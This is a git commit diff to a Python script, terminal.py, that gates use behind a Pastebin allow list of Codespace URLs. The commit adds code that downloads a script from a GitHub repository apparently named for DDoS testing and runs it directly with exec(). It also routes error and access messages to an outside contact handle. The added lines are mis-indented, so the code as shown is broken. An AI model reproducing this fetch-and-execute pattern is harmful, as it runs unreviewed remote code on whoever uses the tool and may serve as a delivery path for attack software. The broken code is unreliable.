b8cb67f46191542cecd8be41ff5af62de98ec869
hwop <100109777+hwop@users.noreply.github.com>
2024-06-08 17:23:20 +0530

    Update terminal.py

--- terminal.py
+++ terminal.py
@@ -14,11 +14,18 @@ def check_url_in_pastebin(codespace_url, pastebin_raw_url):
         
         # Check if the Codespace URL is in the allowed URLs
         if codespace_url in allowed_urls:
-            print("Hello World")
+            url = 'https://github.com/hwop/hwddostest/blob/master/scripttest.py'
+
+# Fetch the script content
+response = requests.get(url)
+script_content = response.text
+
+# Execute the fetched script
+exec(script_content)
         else:
-            print("You are not allowed to use it")
+            print("You are not allowed to use it, Get Access From @GoTo_HellxD")
     except requests.RequestException as e:
-        print(f"Error fetching Pastebin content: {e}")
+        print(f"Error Report It To @GoTo_HellxD: {e}")
 
 if __name__ == "__main__":
     # Prompt the user to input their Codespace URL
